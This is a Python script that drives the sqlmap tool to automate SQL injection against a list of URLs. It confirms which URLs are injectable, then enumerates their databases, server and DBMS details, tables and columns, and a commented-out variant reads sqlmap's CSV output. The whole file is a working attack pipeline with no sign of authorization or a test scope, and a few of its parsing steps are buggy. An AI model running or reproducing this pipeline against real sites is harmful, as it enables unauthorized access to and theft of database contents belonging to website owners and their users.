import subprocess
import os
import csv

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list
        data = f.readlines()
    # Returns the data
    return data

# Function to filter out any results which flag a false positive
def filter_results(data):
    # Stores the verified urls
    verified_urls = []
    
    # Loops over the urls in the data
    for url in data:
        # Outputs the url being verifyed
        print(f"Verifying: {url}")
        
        # Runs sqlmap with --batch to skip prompts
        result = subprocess.run([
            "sqlmap", "-u", url, 
            "--batch", 
            "--level=1", # Keep it fast for verification
            "--flush-session" # Ignore previous results for a clean test
        ], capture_output=True, text=True)

        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls
            verified_urls.append(url)
        else:
            # Ouputs the url was a false positive
            print(f"[-] False Positive: {url}")
    # Returns verified urls
    return verified_urls

# Function to extract the databases
def extract_databases(data):
    # Stores the databases
    databases = []

    # Stores DMBS information
    dbms_info = {}

    # Loops over the data
    for url in data:
        # Runs sqlmap as a subprocess
        database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs"], capture_output=True, text=True)

        # Loops over the split lines of the output
        for line in database_scan.stdout.splitlines():
            # Checks for lines with a database
            if "[*]" in line:
                # Extracts the database from the line
                database = line.split()[-1]

                # Adds to the databases list
                databases.append(database)
            # Checks for the database
            if "web server" in line:
                # Extracts the information
                server_os = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["server_os"] = server_os

            # Checks for web application technology
            if "web application technology" in line:
                # Extracts the information
                technology = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["technology"] = technology

            # Checks for back end dbms
            if "back-end DBMS" in line:
                # Extracts the information
                database_type = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["database_system"] = database_type 

    # Creates unique database list
    unique_databases = list(set(databases))

    # Returns the unique databases
    return unique_databases

# Function to extract the tables
def extract_tables(url, databases):
    # Stores the database tables
    database_tables = {}
    # Loops over the databases
    for database in databases:
        # Initialize the list once per database
        database_tables[database] = []
        
        # Stores the result
        result = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--batch"], capture_output=True, text=True)

        # Loops over the tables
        for line in result.stdout.splitlines():
            # Filter out table header decorations
            if "|" in line and "Table" not in line and "---" not in line:
                # Splits it into part
                parts = line.split("|")
                # Checks if the length is greater then 1
                if len(parts) > 1:
                    # Extracts the table name
                    table_name = parts[1].strip()
                    # Adds it to the database
                    database_tables[database].append(table_name)
    # Returns the database tables
    return database_tables

# Function to extract the columns
def extract_columns(databases,tables,data):
    # Stores the tables data 
    table_data = {}

    # Loops over each of the urls
    for url in data:
        for database in databases:
            # Loops over the tables
            for table in tables:
                # Runs sqlmap as a subprocess
                database_scan = subprocess.run(["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--flush-session", "--batch"], capture_output=True, text=True)

                # Loops over the split lines of the output
                for line in database_scan.stdout.splitlines():
                    # Creates an emtpty entry  in the dictionary
                    table_data[database] = []

                    # Checks for a border in teh line
                    if "|" in line and "Column" not in line and "Type" not in line:
                        # Splits it at the divider
                        table = line.split("|")
                        # Adds the table to the database
                        table_data[database].append(table[1].strip())

    return table_data


'''

example extract function

def extract_tables(url):
    # Define a specific output directory to find files easily
    output_dir = "./sqlmap_results"
    
    # Run sqlmap to enumerate tables
    subprocess.run([
        "sqlmap", "-u", url,
        "--batch",
        "--tables",           
        "--output-dir", output_dir,
        "--flush-session"
    ], capture_output=True)

    # sqlmap saves results in: output_dir/hostname/files/
    # We look for the CSV file it generates
    hostname = url.split("//")[-1].split("/")[0]
    csv_path = f"{output_dir}/{hostname}/csv/tables.csv"
    
    found_tables = []
    
    if os.path.exists(csv_path):
        with open(csv_path, mode='r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                # sqlmap CSVs usually have 'Database' and 'Table' columns
                found_tables.append(row['Table'])
                
    return found_tables
'''